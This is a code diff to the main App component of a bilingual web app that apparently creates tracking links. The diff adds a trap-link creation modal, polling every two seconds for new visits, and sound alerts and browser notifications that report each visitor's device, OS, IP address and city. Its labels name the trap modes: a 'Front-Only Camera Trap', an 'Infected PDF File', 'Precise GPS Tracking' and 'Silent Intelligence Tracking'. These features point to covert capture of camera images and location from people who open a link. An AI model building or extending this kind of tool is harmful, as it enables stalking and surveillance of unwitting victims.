@@ -9,6 +9,10 @@ import { ExifToolView } from './components/ExifToolView';
 import { CyberAwarenessView } from './components/CyberAwarenessView';
 import { SupportView } from './components/SupportView';
 import { RobotCaptchaModal } from './components/RobotCaptchaModal';
+import { SectionTrapModal } from './components/SectionTrapModal';
+import { VisitDetailModal } from './components/VisitDetailModal';
+import { LiveDeviceAlertToast } from './components/LiveDeviceAlertToast';
+import { playAlertChime } from './utils/audioAlert';
 import { Language, translations } from './translations';
 import { TrackingLink, TrackingMode, VisitRecord } from './types';
 import { X, Clock, ExternalLink, Trash2, Globe } from 'lucide-react';
@@ -19,9 +23,18 @@ const LANG_KEY = 'ipsm_lang';
 
 function checkIsRobotVerified(): boolean {
   try {
-    const isLocal = localStorage.getItem('sm_robot_verified') === 'true';
+    const verifiedTimeStr = localStorage.getItem('sm_robot_verified_time');
     const isCookie = document.cookie.includes('sm_robot_verified=true');
-    return isLocal || isCookie;
+    
+    if (verifiedTimeStr) {
+      const verifiedTime = parseInt(verifiedTimeStr, 10);
+      // Fallback: in sandboxed iframe previews, cookies can be disabled/blocked. 
+      // Relying on localStorage timestamp (under 4 hours / 14400000ms) guarantees robust persistence.
+      if (!isNaN(verifiedTime) && (Date.now() - verifiedTime < 14400000)) {
+        return true;
+      }
+    }
+    return false;
   } catch {
     return false;
   }
@@ -72,11 +85,206 @@ export default function App() {
   const [isCreating, setIsCreating] = useState(false);
   const [isRefreshing, setIsRefreshing] = useState(false);
   const [showSavedModal, setShowSavedModal] = useState(false);
-  const [showCaptcha, setShowCaptcha] = useState(false);
+  const [showCaptcha, setShowCaptcha] = useState(() => !checkIsRobotVerified());
+  const [isTrapModalOpen, setIsTrapModalOpen] = useState(false);
+  const [trapModalMode, setTrapModalMode] = useState<TrackingMode>('camera');
   const [pendingView, setPendingView] = useState<MainNavView | null>(null);
 
   const [globalVisits, setGlobalVisits] = useState(800);
   const [globalLinks, setGlobalLinks] = useState(1500);
+
+  const [notificationPermission, setNotificationPermission] = useState<'default' | 'granted' | 'denied'>(() => {
+    if (typeof window !== 'undefined' && 'Notification' in window) {
+      return Notification.permission;
+    }
+    return 'default';
+  });
+  const [knownVisitIds, setKnownVisitIds] = useState<Set<string>>(new Set());
+  const [alertVisitsQueue, setAlertVisitsQueue] = useState<VisitRecord[]>([]);
+  const [selectedGlobalVisit, setSelectedGlobalVisit] = useState<VisitRecord | null>(null);
+
+  const persistLinks = (links: TrackingLink[]) => {
+    setSavedLinks(links);
+    try {
+      localStorage.setItem(SAVED_LINKS_KEY, JSON.stringify(links));
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
+  const fetchLinkData = useCallback(async (code: string) => {
+    setIsRefreshing(true);
+    try {
+      const res = await fetch(`/api/links/${code}`, {
+        headers: { 'x-sm-auth': 'active' }
+      });
+      const contentType = res.headers.get('content-type');
+      if (res.ok && contentType && contentType.includes('application/json')) {
+        const data = await res.json();
+        if (data && data.success) {
+          setCurrentLink(data.link);
+          setVisits(data.visits || []);
+
+          setSavedLinks((prev) => {
+            const next = prev.map((l) =>
+              l.code === code ? { ...l, visitCount: data.visits?.length || 0 } : l
+            );
+            persistLinks(next);
+            return next;
+          });
+          return;
+        }
+      }
+      setActiveCode(null);
+      setCurrentLink(null);
+      setActiveView('home');
+    } catch (err) {
+    } finally {
+      setIsRefreshing(false);
+    }
+  }, []);
+
+  // Request notification permission
+  const handleRequestNotificationPermission = async () => {
+    if (typeof window !== 'undefined' && 'Notification' in window) {
+      const result = await Notification.requestPermission();
+      setNotificationPermission(result);
+      if (result === 'granted') {
+        new Notification(lang === 'ar' ? 'تم تفعيل الإشعارات بنجاح' : 'Notifications enabled successfully', {
+          body: lang === 'ar' ? 'ستتلقى تنبيهاً فورياً عند دخول أي جهاز جديد لأي رابط أو ملف.' : 'You will receive an instant notification when a new device accesses any link or file.',
+          icon: '/favicon.png'
+        });
+      }
+    }
+  };
+
+  // Dismiss toast handler
+  const handleDismissAlert = (visitId: string) => {
+    setAlertVisitsQueue((prev) => prev.filter((v) => v.id !== visitId));
+  };
+
+  // Open details from notification
+  const handleViewAlertDetails = (visit: VisitRecord) => {
+    handleDismissAlert(visit.id);
+    if (visit.code) {
+      setActiveCode(visit.code);
+      setActiveView('track');
+      window.history.pushState({}, '', `?code=${visit.code}`);
+      fetchLinkData(visit.code);
+    }
+    setSelectedGlobalVisit(visit);
+  };
+
+  // Auto-dismiss the oldest toast notification after 12 seconds
+  useEffect(() => {
+    if (alertVisitsQueue.length === 0) return;
+    const timer = setTimeout(() => {
+      setAlertVisitsQueue((prev) => prev.slice(1));
+    }, 12000);
+    return () => clearTimeout(timer);
+  }, [alertVisitsQueue]);
+
+  // Universal real-time polling across ALL links, files, and sections for immediate notifications
+  useEffect(() => {
+    let active = true;
+    const token = getOrSetUserToken();
+
+    const pollAllVisits = async () => {
+      try {
+        const res = await fetch(`/api/user-visits?token=${encodeURIComponent(token)}`, {
+          headers: { 'x-user-token': token, 'x-sm-auth': 'active' }
+        });
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data && data.success && Array.isArray(data.visits) && active) {
+          const incomingVisits: VisitRecord[] = data.visits;
+
+          setKnownVisitIds((prevKnown) => {
+            // First time initialization: populate known set without ringing bells for past history
+            if (prevKnown.size === 0) {
+              return new Set(incomingVisits.map((v) => v.id));
+            }
+
+            const brandNewVisits = incomingVisits.filter((v) => !prevKnown.has(v.id));
+            if (brandNewVisits.length > 0) {
+              // 1. Play alert sound
+              playAlertChime();
+
+              // 2. Dispatch native browser notification
+              if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
+                brandNewVisits.forEach((v) => {
+                  const linkRef = savedLinks.find(l => l.code === v.code);
+                  const linkName = linkRef?.name ? `(${linkRef.name})` : '';
+                  
+                  const sectionLabel = v.mode === 'camera'
+                    ? (lang === 'ar' ? 'قسم فخ الكاميرا الأمامية فقط' : 'Front-Only Camera Trap')
+                    : v.mode === 'pdf'
+                    ? (lang === 'ar' ? 'قسم ملف الـ PDF المفخخ' : 'Infected PDF File')
+                    : v.mode === 'precise'
+                    ? (lang === 'ar' ? 'قسم تتبع GPS الدقيق' : 'Precise GPS Tracking')
+                    : (lang === 'ar' ? 'قسم التتبع الاستخباري الصامت' : 'Silent Intelligence Tracking');
+
+                  new Notification(
+                    lang === 'ar' ? `رصد دخول جديد: ${sectionLabel} ${linkName}` : `New Entry Detected: ${sectionLabel} ${linkName}`,
+                    {
+                      body: `${v.device || 'Device'} (${v.os || 'OS'}) - IP: ${v.ip}\n${[v.city, v.country].filter(Boolean).join(', ')}`,
+                      icon: '/favicon.png',
+                      tag: v.id,
+                      requireInteraction: true
+                    }
+                  );
+                });
+              }
+
+              // 3. Push to interactive in-app toast queue
+              setAlertVisitsQueue((prev) => {
+                const map = new Map(prev.map((item) => [item.id, item]));
+                brandNewVisits.forEach((item) => map.set(item.id, item));
+                return Array.from(map.values()).slice(-4);
+              });
+
+              // 4. If current track dashboard is open and matches one of the new visits, refresh visits list
+              if (activeCode) {
+                const matchesActiveCode = brandNewVisits.some((v) => v.code === activeCode);
+                if (matchesActiveCode) {
+                  fetchLinkData(activeCode);
+                }
+              }
+
+              // 5. Update savedLinks visit counts
+              setSavedLinks((prev) => {
+                const countMap = new Map<string, number>();
+                incomingVisits.forEach((v) => {
+                  countMap.set(v.code, (countMap.get(v.code) || 0) + 1);
+                });
+                return prev.map((l) => ({
+                  ...l,
+                  visitCount: Math.max(l.visitCount || 0, countMap.get(l.code) || 0)
+                }));
+              });
+
+              const updatedSet = new Set(prevKnown);
+              brandNewVisits.forEach((v) => updatedSet.add(v.id));
+              return updatedSet;
+            }
+
+            return prevKnown;
+          });
+        }
+      } catch (err) {
+        // Polling error non-blocking
+      }
+    };
+
+    // Initial poll
+    pollAllVisits();
+    // Periodic poll every 2000ms
+    const interval = setInterval(pollAllVisits, 2000);
+    return () => {
+      active = false;
+      clearInterval(interval);
+    };
+  }, [activeCode, lang, fetchLinkData]);
 
   useEffect(() => {
     document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
@@ -137,52 +345,11 @@ export default function App() {
       .catch((err) => console.warn('Sync user links notice:', err));
   }, []);
 
-  const persistLinks = (links: TrackingLink[]) => {
-    setSavedLinks(links);
-    try {
-      localStorage.setItem(SAVED_LINKS_KEY, JSON.stringify(links));
-    } catch (e) {
-      console.error(e);
-    }
-  };
-
-  const fetchLinkData = useCallback(async (code: string) => {
-    setIsRefreshing(true);
-    try {
-      const res = await fetch(`/api/links/${code}`, {
-        headers: { 'x-sm-auth': 'active' }
-      });
-      const contentType = res.headers.get('content-type');
-      if (res.ok && contentType && contentType.includes('application/json')) {
-        const data = await res.json();
-        if (data && data.success) {
-          setCurrentLink(data.link);
-          setVisits(data.visits || []);
-
-          setSavedLinks((prev) => {
-            const next = prev.map((l) =>
-              l.code === code ? { ...l, visitCount: data.visits?.length || 0 } : l
-            );
-            persistLinks(next);
-            return next;
-          });
-          return;
-        }
-      }
-      setActiveCode(null);
-      setCurrentLink(null);
-      setActiveView('home');
-    } catch (err) {
-    } finally {
-      setIsRefreshing(false);
-    }
-  }, []);
-
   useEffect(() => {
     if (activeCode) {
       fetchLinkData(activeCode);
-      // Fast polling (1.5s in camera mode, 2.5s general) to keep live camera captures and visits in sync
-      const pollRate = currentLink?.mode === 'camera' ? 1500 : 2500;
+      // Ultra-fast polling (800ms in camera mode, 1.5s general) to keep live camera captures and visits in sync
+      const pollRate = currentLink?.mode === 'camera' ? 800 : 1500;
       const interval = setInterval(() => {
         fetchLinkData(activeCode);
       }, pollRate);
@@ -310,6 +477,10 @@ export default function App() {
         onGoHome={handleGoHome}
         activeView={activeCode ? 'track' : activeView}
         onChangeView={handleChangeView}
+        onOpenTrapModal={(mode) => {
+          setTrapModalMode(mode);
+          setIsTrapModalOpen(true);
+        }}
         savedCount={savedLinks.length}
         onOpenSaved={() => setShowSavedModal(true)}
       />
@@ -324,17 +495,19 @@ export default function App() {
             isRefreshing={isRefreshing}
             onDelete={handleDeleteLink}
             onGoHome={handleGoHome}
+            notificationPermission={notificationPermission}
+            onRequestNotificationPermission={handleRequestNotificationPermission}
           />
         ) : activeView === 'ip-lookup' ? (
-          <IpLookupView lang={lang} />
+          <IpLookupView lang={lang} onBack={handleGoHome} />
         ) : activeView === 'mac-lookup' ? (
-          <MacLookupView lang={lang} />
+          <MacLookupView lang={lang} onBack={handleGoHome} />
         ) : activeView === 'exif-tool' ? (
-          <ExifToolView lang={lang} />
+          <ExifToolView lang={lang} onBack={handleGoHome} />
         ) : activeView === 'cyber-awareness' ? (
-          <CyberAwarenessView lang={lang} />
+          <CyberAwarenessView lang={lang} onBack={handleGoHome} />
         ) : activeView === 'support' ? (
-          <SupportView lang={lang} />
+          <SupportView lang={lang} onBack={handleGoHome} />
         ) : (
           <HomeView
             lang={lang}
@@ -344,6 +517,10 @@ export default function App() {
             onSelectLink={handleSelectLink}
             onViewChange={handleChangeView}
             onNavigateIpLookup={() => handleChangeView('ip-lookup')}
+            onOpenTrapModal={(mode) => {
+              setTrapModalMode(mode);
+              setIsTrapModalOpen(true);
+            }}
             globalVisits={globalVisits}
             globalLinks={globalLinks}
           />
@@ -354,6 +531,15 @@ export default function App() {
         isOpen={showCaptcha}
         lang={lang}
         onVerifySuccess={handleCaptchaSuccess}
+      />
+
+      <SectionTrapModal
+        isOpen={isTrapModalOpen}
+        onClose={() => setIsTrapModalOpen(false)}
+        initialMode={trapModalMode}
+        lang={lang}
+        onCreateLink={handleCreateLink}
+        isCreating={isCreating}
       />
 
       {showSavedModal && (
@@ -425,6 +611,24 @@ export default function App() {
             </div>
           </div>
         </div>
+      )}
+
+      {/* Global Real-time Device Alert Toast across all sections & links */}
+      <LiveDeviceAlertToast
+        visits={alertVisitsQueue}
+        lang={lang}
+        onDismiss={handleDismissAlert}
+        onViewDetails={handleViewAlertDetails}
+      />
+
+      {/* Global Visit Detail Modal opened directly from alert toast */}
+      {selectedGlobalVisit && (
+        <VisitDetailModal
+          isOpen={true}
+          onClose={() => setSelectedGlobalVisit(null)}
+          visit={selectedGlobalVisit}
+          lang={lang}
+        />
       )}
 
       <Footer lang={lang} />
